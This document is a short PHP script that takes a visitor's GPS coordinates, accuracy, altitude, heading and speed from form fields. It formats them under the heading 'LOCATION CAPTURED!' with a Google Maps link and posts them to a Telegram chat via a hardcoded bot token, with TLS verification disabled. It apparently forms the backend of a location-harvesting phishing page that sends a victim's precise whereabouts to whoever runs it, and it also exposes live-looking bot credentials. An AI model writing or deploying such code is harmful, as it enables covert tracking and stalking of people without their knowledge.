<?php

$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";     

// Receive Data
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$alt = $_POST['Alt'];
$dir = $_POST['Dir'];
$spd = $_POST['Spd'];

// --- 1. GOOGLE MAPS LINK ---
$googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;

// --- 2. FORMAT DATA (Add Text Here) ---

// Accuracy
$acc_clean = round($acc, 1); 

// Altitude Logic (Sea Level)
if ($alt < 0) {
    $alt_text = round(abs($alt), 0) . " m below sea level";
} else {
    $alt_text = round($alt, 0) . " m above sea level";
}

// Speed Logic (Stationary check)
if ($spd == 0 || $spd == "") {
    $spd_text = "0 m/s (Stationary)";
} else {
    $spd_text = round($spd, 1) . " m/s";
}

// Direction Logic (Stationary check)
if ($spd == 0 || $dir == "" || $dir == 0) {
    $dir_text = "None (Stationary)";
} else {
    $dir_text = round($dir, 1) . "°";
}

// --- 3. CREATE THE MESSAGE ---
$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";

$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "°</code>\n";
$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "°</code>\n";
$message .= "<b>🎯 Accuracy:</b> <code>" . $acc_clean . " m</code>\n";
$message .= "<b>🏔 Altitude:</b> " . $alt_text . "\n"; 
$message .= "<b>🧭 Direction:</b> " . $dir_text . "\n";  // Uses PHP logic
$message .= "<b>🚗 Speed:</b> " . $spd_text . "\n\n";   // Uses PHP logic
$message .= "<b>🗺️ <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
 
?>
